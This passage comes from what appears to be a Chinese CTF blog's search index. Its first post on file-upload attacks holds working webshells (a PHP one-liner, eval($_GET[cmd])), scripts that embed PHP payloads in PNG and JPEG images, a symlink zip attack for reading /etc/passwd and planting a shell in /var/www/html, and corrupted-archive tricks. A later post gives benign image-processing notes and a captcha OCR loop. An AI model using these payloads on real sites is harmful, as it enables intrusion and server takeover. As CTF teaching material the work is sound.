0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;./1.png&#x27;);?&gt; 运行脚本即可生成，这里的一句话木马是： &lt;?$_GET[0]($_POST[1]);?&gt; 使用方式是get传参0，加上post传参1。 jpg 由于jpg图片易损，对图片的选取有很大关系，很容易制作失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;?php $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 运行脚本命令： jpg_payload.php 1.jpg ​ 软链接攻击任意读（unzip）unzip()存在软链接攻击，发现可以通过上传一个软链接的压缩包，把特定文件像个钩子一样勾出来，实现任意文件读取： 123ln -s // linux的软链接 类似快捷方式ln -s /etc/passwd forever404 //会出现一个forever404文本 里面包含有密码/proc/self // 记录系统运行的信息状态 cwd指向当前进程运行目录的一个符号链接 即Flask运行进程目录 操作方式 先构造一个指向 /var/www/html 的软连接： 12ln -s /var/www/html testzip --symlinks test.zip ./* 此时上传该test.zip，解压出里边的文件也是软连接 /var/www/html 目录下； 接下来的思路就是想办法构造一个getshell文件让getshell文件正好解压在 /var/www/html，此时就可以getshell。 构造第二个压缩包，先创建一个test目录（因为上一个压缩包里边目录就是test），在test目录下写一个shell文件，在压缩创建的test目录 此时压缩包目录架构是：test/cmd.php。 12345mkdir testcd testecho &quot;&lt;?php @eval($_GET[cmd]);&quot; &gt; cmd.phpcd ..zip -r test1.zip ./* 当上传这个压缩包时会覆盖上一个test目录，但是test目录软链接指向 /var/www/html，解压的时候会把cmd.php放在 /var/www/html，此时达到了getshell的目的。 ​ 只解压一半的压缩包（解压一半出错） Windows 7zip 7zip的容忍度很低，只要压缩包中某一个文件的CRC校验码出错，就会报错退出。 修改方法： 准备两个文件，一个PHP文件1.php，一个文本文件2.txt，其中1.php说webshell，然后将这两个文件压缩成shell.zip。 用010editor打开shell.zip，可以看到右下角有这个文件的格式信息，它被分成5部分，打开第4部分，其中有个deCrc，随便把值改成其他的值，然后保存。 此时用7zip解压就会出错，解压出的1.php是完好的，2.txt是一个空文件。 PHP ZipArchive库 ZipArchive容忍度比较高，可以在文件名上下功夫。 比如，Windows下不允许文件名中包含冒号（:），可以在010editor中将2.txt的deFileName属性的值改成2.tx:，此时解压就会出错，但1.php被保留了下来。 在Linux中也有类似的方法，可以将文件名改为5个斜杠（/////），此时Linux下解压也会出错，但1.php被保留了下来。","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://lazzzaro.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Lazzaro"},{"title":"图像处理","slug":"misc-图像处理","date":"2020-05-06T12:56:42.000Z","updated":"2022-07-19T16:40:17.117Z","comments":true,"path":"2020/05/06/misc-图像处理/","link":"","permalink":"https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/","excerpt":"","text":"​ Pillow12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#基本操作from PIL import Image #引用Image类im = Image.new(&#x27;RGB&#x27;,(110,80)) #新建图片im = Image.open(&#x27;x.jpg&#x27;) #加载图片print(im.format,im.size,im.mode) #format-格式，size-(宽&amp;高)，mode-模式im.show() #呈现图片im.getcolors() #获取图片信息，一般会返回一个元组(count,(r,g,b))。该元组第一个元素count 代表该颜色像素出现的次数，第二个元素表示(rgb)。im.convert(&#x27;RGB&#x27;).getpixel((0,0)) #获取像素点的RGB值Image.save(&#x27;y.png&#x27;) #保存文件#图片剪切#box是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。假设box是(x1,y1,x2,y2)，则所取区域是以各自坐标划线所围的区域。im = Image.open(&#x27;x.jpg&#x27;)box = (150,150,245,280)region = im.crop(box)region.show()#图片粘贴#将一张图覆盖到另一张图上面。格式为：paste(要贴的图片，要贴的图片的4元坐标组成的区域)。im = Image.open(&#x27;x.jpg&#x27;)box = (50,50,200,200)region = im.crop(box)# 将图片逆序旋转180后，黏贴到原来复制的位置 region = region.transpose(Image.ROTATE_180)im.paste(region,box)im.show()#图像序列#当处理GIF这种包含多个帧的图片，称之为序列文件，PIL会自动打开序列文件的第一帧。而使用seek和tell方法可以在不同帧移动。tell是帧数，而seek是取当前帧数的图片。from PIL import Imageim = Image.open(&quot;laopo.gif&quot;)im.seek(1)im.show()try: while 1: im.seek(im.tell()+1) im.show()except EOFError: pass#读取/修改像素from PIL import Imageimg = Image.open(&#x27;x.jpg&#x27;)width , height = img.sizefor i in range(0,width): for j in range(0,height): tmp = img.getpixel((i,j)) img.putpixel((i,j),(0,0,tmp[2]))img.show() ​ OpenCV21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#图像读入import cv2img = cv2.imread(r&#x27;x.jpg&#x27;,0)#图像显示cv2.imshow(&#x27;tupian&#x27;,img)cv2.waitKey()#图像保存cv2.imwrite(&#x27;tupian,jpg&#x27;,img)#图像属性print(img.shape) #shape 返回图像行数、列数、通道数print(img.size) #size 返回图像像素数print(img.dtype) #dtype 返回图像的数据类型#通道拆分/合并#拆分为B、G、R三个通道#索引拆分B = img[:,:,0]G = img[:,:,1]R = img[:,:,2]#函数拆分B,G,R = cv2.split(img)#合并bgr = cv2.merge([b,g,r])#类型转换#将BGR模式转换为灰度图像，再将灰度图像转换为RGB模式import cv2import numpy as npbgr=np.random.randint(0,256,size=[2,4,3],dtype=np.uint8) #生成2×4×3的BGR图像gray=cv2.cvtColor(bgr,cv2.COLOR_BGR2GRAY) #BGR图像转换为灰度图像rgb=cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB) #灰度图像转换为RGB图像print(&#x27;bgr=\\n&#x27;,bgr)print(&#x27;gray=\\n&#x27;,gray)print(&#x27;rgb=\\n&#x27;,rgb)# 在RGB色彩空间的基础上，还可以加一个A通道，叫做Alpha通道，此时原图像类型转变为RGBA模式，例如常见的PNG类型图像就是RGBA色彩空间的。#分析alpha通道的值import cv2import numpy as npimg=np.random.randint(0,256,size=[2,3,3],dtype=np.uint8) #生成2×3×3的BGR图像bgra=cv2.cvtColor(img,cv2.COLOR_BGR2BGRA)print(&#x27;img=\\n&#x27;,img)print(&#x27;bgra=\\n&#x27;,bgra)b,g,r,a=cv2.split(bgra)print(&#x27;a=\\n&#x27;,a)a[:,:]=125bgra=cv2.merge([b,g,r,a])print(&#x27;bgra=\\n&#x27;,bgra)#傅里叶变换img = cv2.imread(r&quot;x.jpg&quot;,0)# 图像数据要转换成float32img_float32 = np.float32(img)#进行傅里叶变换dft = cv2.dft(img_float32,flags = cv2.DFT_COMPLEX_OUTPUT)# 将低频信息转换至图像中心dft_shift = np.fft.fftshift(dft)# 傅里叶变换后的数据是由实部虚部构成的，需要进行转换成图像格式才能显示(0,255)magnitude = 20*np.log(cv2.magnitude(dft_shift[:,:,0],dft_shift[:,:,1]))plt.subplot(121),plt.imshow(img,cmap = &#x27;gray&#x27;)plt.subplot(122),plt.imshow(magnitude,cmap=&#x27;gray&#x27;)plt.show() ​ Matplotlib123456789101112131415161718192021222324252627#显示图片import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as nppicture = mpimg.imread(&#x27;x.jpg&#x27;) # 读取和代码处于同一目录下的图片plt.imshow(picture) # 显示图片plt.axis(&#x27;on&#x27;) # 显示坐标轴plt.show() #因为idle是pycharm所以多一行显示命令#显示RGB某个通道lena1 = picture*[0,0,1] # 显示图片的一个通道lena2 = picture*[1,0,0]lena3 = picture*[0,1,0]#RGB转灰度def rgb2gray2(rgb): r, g, b = rgb[:,:,0], rgb[:,:,1], rgb[:,:,2] #数组切片 gray = 0.2989 * r + 0.5870 * g + 0.1140 * b return graygray_pro = rgb2gray2(picture)plt.imshow(gray_pro,cmap = plt.get_cmap(&#x27;gray&#x27;))plt.axis(&#x27;on&#x27;) # 显示坐标轴plt.show()#保存图片plt.savefig(&#x27;xx.jpg&#x27;) ​ OCR验证码 123456789101112131415161718192021222324252627282930313233343536373839404142import osimport timeimport refrom PIL import Imageimport ddddocrimport onnxruntimeimport requestsfrom base64 import b64decodeurl = &quot;http://&quot;sess = requests.Session()ocr = ddddocr.DdddOcr(use_gpu=True)onnxruntime.set_default_logger_severity(3)def pic_to_text(text): img = re.findall(r&quot;base64,(.*?)&gt;&quot;, text)[0] open(&quot;v_code_LA.png&quot;, &quot;wb&quot;).write(b64decode(img.encode())) v_code = Image.open(&quot;v_code_LA.png&quot;) v_code.convert(&quot;L&quot;) v_code.save(&quot;v_code.png&quot;) v_code_bytes = open(&#x27;v_code.png&#x27;, &#x27;rb&#x27;).read() code = ocr.classification(v_code_bytes) os.remove(&quot;v_code.png&quot;) return code.lower()def validate(text): cnt = int(re.findall(r&quot;done (.*?) times&quot;, text)[0]) if cnt == 1000: print(text) return code = pic_to_text(text) if len(code) != 4: return data = &#123; &quot;v_code&quot;: code &#125; sess.post(url,data)if __name__ == &quot;__main__&quot;: while 1: res = sess.get(url) validate(res.text) time.sleep(2) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# 百度APIfrom urllib import responseimport requestsimport base64url = &quot;http://47.97.127.1:28583/&quot;def getToken(): token_url = url + &quot;/getToken&quot; response = requests.get(token_url) return response.json()[&#x27;data&#x27;][&#x27;token&#x27;]def ocr(img_base64): # client_id 为官网获取的AK， client_secret 为官网获取的SK host = &#x27;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=【你的】&amp;client_secret=【你的】&#x27; response = requests.get(host) token = response.json()[&#x27;access_token&#x27;] &#x27;&#x27;&#x27; 通用文字识别（高精度版） &#x27;&#x27;&#x27; request_url = &quot;https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic&quot; params = &#123;&quot;image&quot;:img_base64&#125; access_token = token request_url = request_url + &quot;?access_token=&quot; + access_token headers = &#123;&#x27;content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125; response = requests.post(request_url, data=params, headers=headers) return response.json()[&#x27;words_result&#x27;]def getViolWords(): words_url = url + &quot;/getViolWords&quot; response = requests.get(words_url) return response.json()[&#x27;data&#x27;][&#x27;violWords&#x27;] def getPic(token): pic_url = url + &quot;/getPic&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(pic_url,json=data) return response.json()[&#x27;data&#x27;][&#x27;words&#x27;][&#x27;w1&#x27;]def checkWords(violWords,picWords): try: picWords = picWords[0][&#x27;words&#x27;] except: pass print(picWords) for i in violWords: if i.replace(&quot; &quot;,&#x27;&#x27;).strip() in picWords: return False return Truedef submit(token,answer): submit_url = url + &quot;/submits&quot; data = &#123;&quot;token&quot;:token,&quot;answer&quot;:answer&#125; response = requests.post(submit_url,json=data) return response.json()def getResult(token): result_url = url + &quot;/getResult&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(result_url,json=data) return response.json()[&#x27;data&#x27;]def getFlag(token): flag_url = url + &quot;/getFlag&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(flag_url,json=data) return response.json()token = getToken()violWords = getViolWords()for i in range(51): pic = getPic(token) picWords = ocr(pic) result = checkWords(violWords,picWords) print(result) print(submit(token,result)) print(getResult(token))print(getFlag(token)) ​ 拼图12345678910montage *.jpg -tile 10x12 -geometry 200x100+0+0 out.jpg #把图片碎片合成一个图片# 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpggaps --image=out.jpg --generations=50 --population=120 --size=100 #还原原图片# --image 指向拼图的路径# --size 拼图块的像素尺寸# --generations 遗传算法的代的数量# --population 个体数量# --verbose 每一代训练结束后展示最佳结果# --save 将拼图还原为图像 ​ Arnold变换 / 猫脸变换12345678910111213141516171819202122232425262728293031323334import cv2import numpy as npdef arnold_decode(image, shuffle_times, a, b): &quot;&quot;&quot; decode for rgb image that encoded by Arnold Args: image: rgb image encoded by Arnold shuffle_times: how many times to shuffle Returns: decode image &quot;&quot;&quot; # 1:创建新图像 decode_image = np.zeros(shape=image.shape,dtype=int) # 2：计算N h, w = image.shape[0], image.shape[1] N = h # 或N=w # 3：遍历像素坐标变换 for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): # 按照公式坐标变换 new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return decode_imageimg = cv2.imread(&quot;a.png&quot;) #变换的图片a = 121b = 144st = 1pic = arnold_decode(img,st,a,b)cv2.imwrite(&#x27;b.png&#x27;,pic) #保存得到的图片 工具： Catmap Zhanxw Cat ​ 马赛克unredacter","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"图像","slug":"图像","permalink":"https://lazzzaro.github.io/tags/%E5%9B%BE%E5%83%8F/"}],"author":"Lazzaro"}],"categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"},{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"},{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"},{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"},{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"},{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"},{"name":"other","slug":"other","permalink":"https://lazzzaro.github.io/categories/other/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"},{"name":"后量子密码","slug":"后量子密码","permalink":"https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"},{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"堆","slug":"堆","permalink":"https://lazzzaro.github.io/tags/%E5%A0%86/"},{"name":"栈","slug":"栈","permalink":"https://lazzzaro.github.io/tags/%E6%A0%88/"},{"name":"OT","slug":"OT","permalink":"https://lazzzaro.github.io/tags/OT/"},{"name":"hash","slug":"hash","permalink":"https://lazzzaro.github.io/tags/hash/"},{"name":"WebAssembly","slug":"WebAssembly","permalink":"https://lazzzaro.github.io/tags/WebAssembly/"},{"name":"wasm","slug":"wasm","permalink":"https://lazzzaro.github.io/tags/wasm/"},{"name":"XXE","slug":"XXE","permalink":"https://lazzzaro.github.io/tags/XXE/"},{"name":"反调试","slug":"反调试","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"曲线","slug":"曲线","permalink":"https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"},{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"Unity","slug":"Unity","permalink":"https://lazzzaro.github.io/tags/Unity/"},{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"},{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"流量","slug":"流量","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"},{"name":"USB","slug":"USB","permalink":"https://lazzzaro.github.io/tags/USB/"},{"name":"ECC","slug":"ECC","permalink":"https://lazzzaro.github.io/tags/ECC/"},{"name":"块密码","slug":"块密码","permalink":"https://lazzzaro.github.io/tags/%E5%9D%97%E5%AF%86%E7%A0%81/"},{"name":"AES","slug":"AES","permalink":"https://lazzzaro.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://lazzzaro.github.io/tags/DES/"},{"name":"格密码","slug":"格密码","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/"},{"name":"流密码","slug":"流密码","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"XSS","slug":"XSS","permalink":"https://lazzzaro.github.io/tags/XSS/"},{"name":"SSRF","slug":"SSRF","permalink":"https://lazzzaro.github.io/tags/SSRF/"},{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"},{"name":"逃逸","slug":"逃逸","permalink":"https://lazzzaro.github.io/tags/%E9%80%83%E9%80%B8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://lazzzaro.github.io/tags/CSRF/"},{"name":"JWT","slug":"JWT","permalink":"https://lazzzaro.github.io/tags/JWT/"},{"name":"渗透","slug":"渗透","permalink":"https://lazzzaro.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"https://lazzzaro.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"内网","slug":"内网","permalink":"https://lazzzaro.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"命令行","slug":"命令行","permalink":"https://lazzzaro.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Linux","slug":"Linux","permalink":"https://lazzzaro.github.io/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"https://lazzzaro.github.io/tags/Bash/"},{"name":"取证","slug":"取证","permalink":"https://lazzzaro.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"},{"name":"脚本","slug":"脚本","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"密码","slug":"密码","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"CMS","slug":"CMS","permalink":"https://lazzzaro.github.io/tags/CMS/"},{"name":"编码","slug":"编码","permalink":"https://lazzzaro.github.io/tags/%E7%BC%96%E7%A0%81/"},{"name":"反编译","slug":"反编译","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"name":"fuzz","slug":"fuzz","permalink":"https://lazzzaro.github.io/tags/fuzz/"},{"name":"SQL","slug":"SQL","permalink":"https://lazzzaro.github.io/tags/SQL/"},{"name":"注入","slug":"注入","permalink":"https://lazzzaro.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"反序列化","slug":"反序列化","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"RCE","slug":"RCE","permalink":"https://lazzzaro.github.io/tags/RCE/"},{"name":"SSTI","slug":"SSTI","permalink":"https://lazzzaro.github.io/tags/SSTI/"},{"name":"算法","slug":"算法","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"pwntools","slug":"pwntools","permalink":"https://lazzzaro.github.io/tags/pwntools/"},{"name":"自动化","slug":"自动化","permalink":"https://lazzzaro.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"angr","slug":"angr","permalink":"https://lazzzaro.github.io/tags/angr/"},{"name":"z3","slug":"z3","permalink":"https://lazzzaro.github.io/tags/z3/"},{"name":"IDA","slug":"IDA","permalink":"https://lazzzaro.github.io/tags/IDA/"},{"name":"Sage","slug":"Sage","permalink":"https://lazzzaro.github.io/tags/Sage/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://lazzzaro.github.io/tags/gmpy2/"},{"name":"Android","slug":"Android","permalink":"https://lazzzaro.github.io/tags/Android/"},{"name":"离散对数","slug":"离散对数","permalink":"https://lazzzaro.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://lazzzaro.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"图像","slug":"图像","permalink":"https://lazzzaro.github.io/tags/%E5%9B%BE%E5%83%8F/"}]}